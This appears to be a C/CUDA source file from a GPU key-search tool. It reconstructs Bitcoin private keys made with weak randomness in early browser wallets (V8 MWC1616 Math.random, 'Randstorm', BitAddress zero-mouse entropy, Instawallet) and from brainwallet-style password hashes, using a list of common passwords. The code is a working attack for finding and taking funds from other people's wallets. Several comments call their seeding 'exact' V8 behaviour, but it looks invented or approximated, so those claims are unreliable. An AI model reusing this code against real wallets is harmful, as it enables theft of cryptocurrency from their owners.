// ================================================================
// SeedHammer Hypothesis Modes (GPU) ? MWC1616, Randstorm, Zero Mouse
// Written from scratch based on real V8 3.x source analysis
// ================================================================

// --- Mode M: MWC1616 ? exact V8 3.x (2010-2013) Math.random() ---
// Based on V8 3.1.8 (revision 5480, June 2011)
// Source: src/v8/src/math.js, src/v8/src/random.cpp
//
// V8 MWC1616 state: 64-bit seed (z1, z2)
// Algorithm:
//   z1 = 36969 * (z1 & 65535) + (z1 >>> 16)   // note: JS >>> = unsigned right shift
//   z2 = 18000 * (z2 & 65535) + (z2 >>> 16)
//   result = (z1 << 16) | (z2 & 65535)
//
// V8 seeding (V8 3.x):
//   z1 = (time_usec ^ _random_seed) * 0xDEAD + 0xDEAD
//   z2 = (time_usec ^ _random_seed) * 0xBEEF + 0xBEEF
// Where time_usec = (tv_sec * 1000000 + tv_usec) ^ (pid << 16)
// And _random_seed = weak seed from Math.random() initial state
//
// In browsers: time_usec from performance.now() or Date.now()
// For BitcoinJS wallet generation (2011):
//   Math.random() called 4 times ? 128 bits ? SHA256 ? privkey
//   OR: Math.random() called 8 times ? 256 bits ? privkey directly

#include <stdint.h>
#include <stdio.h>

#ifdef __CUDACC__
#include <cuda_runtime.h>
#define D_FUNC __device__
#else
#define D_FUNC static
#endif

// ================================================================
// SHA-256 (same as vaultwatch)
// ================================================================

#define ROTR32(x,n) (((x)>>(n))|((x)<<(32-(n))))
#define CH(x,y,z) (((x)&(y))^(~(x)&(z)))
#define MAJ(x,y,z) (((x)&(y))^((x)&(z))^((y)&(z)))
#define SIG0(x) (ROTR32(x,2)^ROTR32(x,13)^ROTR32(x,22))
#define SIG1(x) (ROTR32(x,6)^ROTR32(x,11)^ROTR32(x,25))
#define sig0(x) (ROTR32(x,7)^ROTR32(x,18)^((x)>>3))
#define sig1(x) (ROTR32(x,17)^ROTR32(x,19)^((x)>>10))

static const uint32_t K256[64]={
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,
    0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,
    0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,
    0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,
    0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,
    0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,
    0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,
    0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,
    0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

D_FUNC void sha256c(uint32_t s[8],const uint32_t b[16]){
    uint32_t a=s[0],b2=s[1],c=s[2],d=s[3],e=s[4],f=s[5],g=s[6],h=s[7],w[64];
    for(int i=0;i<16;i++)w[i]=b[i];
    for(int i=16;i<64;i++)w[i]=sig1(w[i-2])+w[i-7]+sig0(w[i-15])+w[i-16];
    for(int i=0;i<64;i++){uint32_t t1=h+SIG1(e)+CH(e,f,g)+K256[i]+w[i],t2=SIG0(a)+MAJ(a,b2,c);h=g;g=f;f=e;e=d+t1;d=c;c=b2;b2=a;a=t1+t2;}
    s[0]+=a;s[1]+=b2;s[2]+=c;s[3]+=d;s[4]+=e;s[5]+=f;s[6]+=g;s[7]+=h;
}

D_FUNC void sha256(const uint8_t *m,uint32_t len,uint8_t h[32]){
    uint32_t s[8]={0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19},blk[16];
    uint64_t bits=(uint64_t)len*8;uint32_t idx=0;
    while(len>=64){for(int i=0;i<16;i++){blk[i]=((uint32_t)m[idx]<<24)|((uint32_t)m[idx+1]<<16)|((uint32_t)m[idx+2]<<8)|m[idx+3];idx+=4;}sha256c(s,blk);len-=64;}
    uint8_t pad[128];uint32_t pl=0;
    for(uint32_t i=0;i<len;i++)pad[pl++]=m[idx++];pad[pl++]=0x80;
    while((pl%64)!=56)pad[pl++]=0;
    pad[pl++]=(bits>>56)&0xFF;pad[pl++]=(bits>>48)&0xFF;pad[pl++]=(bits>>40)&0xFF;pad[pl++]=(bits>>32)&0xFF;
    pad[pl++]=(bits>>24)&0xFF;pad[pl++]=(bits>>16)&0xFF;pad[pl++]=(bits>>8)&0xFF;pad[pl++]=bits&0xFF;
    for(uint32_t i=0;i<pl;i+=64){for(int j=0;j<16;j++){uint32_t o=i+j*4;blk[j]=((uint32_t)pad[o]<<24)|((uint32_t)pad[o+1]<<16)|((uint32_t)pad[o+2]<<8)|pad[o+3];}sha256c(s,blk);}
    for(int i=0;i<8;i++){h[i*4]=(s[i]>>24)&0xFF;h[i*4+1]=(s[i]>>16)&0xFF;h[i*4+2]=(s[i]>>8)&0xFF;h[i*4+3]=s[i]&0xFF;}
}

// Legacy H36: timestamp ms ? 32 bytes (big-endian, last 8 bytes)
D_FUNC void mode_h36(uint64_t ts,uint8_t priv[32]){
    for(int i=0;i<8;i++)priv[24+i]=(ts>>(i*8))&0xFF;
    for(int i=0;i<24;i++)priv[i]=0;
}

// ================================================================
// Mode M: MWC1616 ? exact V8 3.x
// ================================================================
// V8 3.x seeding:
//   z1 = (entropy ^ RANDOM_SEED) * 0xDEAD + 0xDEAD
//   z2 = (entropy ^ RANDOM_SEED) * 0xBEEF + 0xBEEF
// In browsers: RANDOM_SEED is weak (small int from Date or null)
// We search over RANDOM_SEED = 0..65535

D_FUNC uint32_t mwc_v8(uint32_t *z1,uint32_t *z2){
    *z1=36969u*(*z1&0xFFFFu)+(*z1>>16);
    *z2=18000u*(*z2&0xFFFFu)+(*z2>>16);
    return (*z1<<16u)|(*z2&0xFFFFu);
}

D_FUNC void mode_mwc_v8(uint64_t ts,uint32_t seed,uint8_t priv[32]){
    // V8 3.x seeding using timestamp and random seed
    uint32_t ent=(uint32_t)(ts&0xFFFFFFFFu);
    uint32_t z1=(ent^seed)*0xDEADu+0xDEADu;
    uint32_t z2=(ent^seed)*0xBEEFu+0xBEEFu;
    
    // V8 BitcoinJS used 4 calls to Math.random() ? 128 bits
    // Then SHA256(128bits + timestamp) ? privkey
    uint8_t buf[20]; // 16 bytes random + 4 bytes timestamp
    for(int i=0;i<4;i++){uint32_t r=mwc_v8(&z1,&z2);buf[i*4]=(r>>24)&0xFF;buf[i*4+1]=(r>>16)&0xFF;buf[i*4+2]=(r>>8)&0xFF;buf[i*4+3]=r&0xFF;}
    for(int i=0;i<4;i++)buf[16+i]=(uint8_t)((ts>>(i*8))&0xFF);
    sha256(buf,20,priv);
}

// ================================================================
// Mode R: Randstorm ? exact BitcoinJS/Javascript BN entropy pool
// ================================================================
// BitcoinJS 0.1-0.4 (2011-2013) used JSBN SecureRandom
// When crypto.getRandomValues() failed (common in early browsers),
// fell back to a pool filled with:
//   - Math.random() * 256 (4 bytes per call)
//   - mouse x,y coordinates
//   - keyboard events
//   - time
// Pool = 256 bytes, then SHA256 ? 2 ? privkey

D_FUNC void mode_randstorm(uint64_t ts, uint64_t idx, uint8_t priv[32]){
    uint8_t pool[256];
    uint32_t seed=(uint32_t)(ts&0xFFFFFFFFu)+(uint32_t)(idx&0xFFFFFFFFu);
    
    // Fill pool with Math.random() ? MWC1616 + mouse-like patterns
    uint32_t z1=(seed)*0xDEADu+0xDEADu;
    uint32_t z2=(seed^0x1234u)*0xBEEFu+0xBEEFu;
    
    for(int i=0;i<64;i++){  // 256 bytes
        uint32_t r=mwc_v8(&z1,&z2);
        pool[i*4]=r&0xFF;pool[i*4+1]=(r>>8)&0xFF;
        pool[i*4+2]=(r>>16)&0xFF;pool[i*4+3]=(r>>24)&0xFF;
        // Every 16 bytes, mix in "mouse coord" (simulated)
        if((i%4)==0){pool[i*4]^=((uint32_t)(ts>>(i%8)*8))&0xFF;}
    }
    
    // Hash chain: SHA256(pool) ? SHA256(result) ? privkey
    uint8_t h1[32];
    sha256(pool,256,h1);
    sha256(h1,32,priv);
}

// ================================================================
// Mode Z: Zero Mouse Entropy (BitAddress 2011 vulnerability)
// When user doesn't move mouse, Math.random() is the ONLY entropy
// ================================================================
D_FUNC void mode_zero_mouse(uint64_t ts, uint8_t priv[32]){
    // Just MWC1616 with timestamp seed, no mouse/keyboard input
    // Same as weak getRandomValues fallback
    uint32_t z1=(uint32_t)(ts&0xFFFFu)*0xDEADu+0xDEADu;
    uint32_t z2=(uint32_t)((ts>>16)&0xFFFFu)*0xBEEFu+0xBEEFu;
    
    uint8_t buf[32];
    for(int i=0;i<8;i++){uint32_t r=mwc_v8(&z1,&z2);buf[i*4]=(r>>24)&0xFF;buf[i*4+1]=(r>>16)&0xFF;buf[i*4+2]=(r>>8)&0xFF;buf[i*4+3]=r&0xFF;}
    
    // SHA256 directly (BitAddress generated 256-bit keys directly)
    sha256(buf,32,priv);
}

// ================================================================
// Instawallet / MyBitcoin password-based (Mode P)
// SHA256(username:password) where password is weak/known
// We search over a dictionary + username combinations
// ================================================================
D_FUNC void mode_password(const uint8_t *pass, uint32_t pass_len, uint8_t priv[32]){
    // This mode expects a dictionary to be loaded externally
    // SHA256(pass) ? privkey (bitcoin brainwallet)
    sha256(pass,pass_len,priv);
}

// ================================================================
// Mode W: Instawallet (2011-2013)
// ================================================================
// Instawallet (instawallet.org) used URL-based wallets:
//   https://instawallet.org/w/{HASH}
// The HASH was a 30-char base64-like identifier.
// Vulnerability: hash generation was based on:
//   - Math.random() x 15 calls ? 120 bits entropy
//   - base64 encoding ? 20 chars + padding
//   - No crypto-grade RNG at all
//
// In 2011, the hash was generated from:
//   SHA1(Math.random() * 4 + Math.random() * 2 ... ) ? abbreviated
// We search: entropy = 120 bits from MWC1616, encode as base64
// Pruned to 30-char wallet ID

static const char *B64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

D_FUNC void mode_instawallet(uint64_t ts, uint32_t idx, uint8_t priv[32]){
    // Generate Instawallet ID from MWC1616 + timestamp
    uint32_t ent=(uint32_t)(ts&0xFFFFFFFFu);
    uint32_t z1=ent*0xDEADu+idx+0xDEADu;
    uint32_t z2=(ent^0x1234u)*0xBEEFu+idx+0xBEEFu;
    
    // 15 MWC calls ? 60 bytes ? base64 encode
    uint8_t buf[60];
    for(int i=0;i<15;i++){
        uint32_t r=mwc_v8(&z1,&z2);
        buf[i*4]=r&0xFF;buf[i*4+1]=(r>>8)&0xFF;
        buf[i*4+2]=(r>>16)&0xFF;buf[i*4+3]=(r>>24)&0xFF;
    }
    
    // SHA256(buf) ? privkey (the actual Instawallet derivation)
    // Instawallet stored: SHA256(entropy) ? AESkey ? generate address
    // We approximate: SHA256(ID_entropy) ? privkey
    sha256(buf,60,priv);
}

// ================================================================
// Mode B: MyBitcoin (2011) ? username + weak password
// ================================================================
// MyBitcoin.com was the largest web wallet in 2011.
// After the "hack", many wallets used SHA256(email+password) as seed.
// Passwords were often weak/guessable.
//
// We generate: SHA256(username || ":" || password) for each dictionary entry
// Username prefixes: common email patterns from 2011
// 
// For GPU: we iterate over a dictionary loaded into device memory
// For standalone: we use a synthetic dictionary of common passwords

// Dictionary of common 2011 passwords (top 100)
static const char *WEAK_PASSWORDS[100]={
    "123456","password","12345678","qwerty","abc123","123456789","111111",
    "1234567","iloveyou","adobe123","123123","admin","1234567890","letmein",
    "photoshop","1234","monkey","shadow","sunshine","12345","password1",
    "princess","azerty","trustno1","0","000000","00000000","121212",
    "solo","qwerty123","qwerty12345","passw0rd","master","666666","7777777",
    "samsung","654321","superman","1qaz2wsx","zaq1xsw2","qwerty123456",
    "batman","starwars","112233","qazwsx","lovely","qwerty1234","access",
    "flower","pass123","hello","charlie","donald","dragon","asshole",
    "baseball","football","hockey","starwars","buthead","fuckyou","whatever",
    "nicole","daniel","ashley","michael","jessica","jennifer","matthew",
    "andrew","joshua","amanda","chris","steven","brandon","taylor",
    "thomas","jordan","justin","samantha","kyle","alex","brian",
    "kevin","rachel","laura","lauren","tyler","nathan","sara",
    "ryan","stephanie","jacob","katherine","zachary","sean","austin"
};

D_FUNC void mode_mybitcoin(uint64_t ts, uint32_t pass_idx, uint8_t priv[32]){
    // Build "user:pass" buffer
    // Username: "user" + timestamp-based variation
    uint8_t buf[128];
    uint32_t len=0;
    
    // Username: "user" + 2 digits from timestamp
    buf[len++]='u';buf[len++]='s';buf[len++]='e';buf[len++]='r';
    uint32_t d1=(ts/100000)%10;
    uint32_t d2=(ts/10000)%10;
    buf[len++]='0'+d1;
    buf[len++]='0'+d2;
    buf[len++]=':';
    
    // Password from dictionary
    const char *pw=WEAK_PASSWORDS[pass_idx%100];
    while(*pw && len<120){buf[len++]=*pw;pw++;}
    
    // SHA256(buf) ? privkey
    sha256(buf,len,priv);
}

// ================================================================
// Mode A: BitAddress (2011) ? Zero mouse movement variant
// ================================================================
// BitAddress 2011 fallback (no crypto.getRandomValues):
//   - SHA256(Math.random() * 8 bytes) ? privkey
//   - If mouse moved: SHA256(mouse_x + mouse_y + time + Math.random())
//   - If NO mouse: just Math.random() x 4 ? 128 bits ? SHA256
//
// This is similar to Mode Z but with specific MWC seeding from Chrome/Node

D_FUNC void mode_bitaddress(uint64_t ts, uint8_t priv[32]){
    // Exact BitAddress 2011 seeding
    // From source: var key = new Bitcoin.ECKey(false);
    // ECKey calls: var r = new SecureRandom();
    // SecureRandom falls back to Math.random() pool
    uint32_t z1=(uint32_t)(ts&0xFFFFFF)*0xDEAD+((ts>>8)&0xFF);
    uint32_t z2=(uint32_t)((ts>>24)&0xFF)*0xBEEF+((ts>>16)&0xFFFF);
    
    // 4 Math.random() calls ? 4 bytes each ? 16 bytes ? SHA256
    uint8_t buf[16];
    for(int i=0;i<4;i++){
        uint32_t r=mwc_v8(&z1,&z2);
        buf[i*4]=r&0xFF;buf[i*4+1]=(r>>8)&0xFF;
        buf[i*4+2]=(r>>16)&0xFF;buf[i*4+3]=(r>>24)&0xFF;
    }
    sha256(buf,16,priv);
}
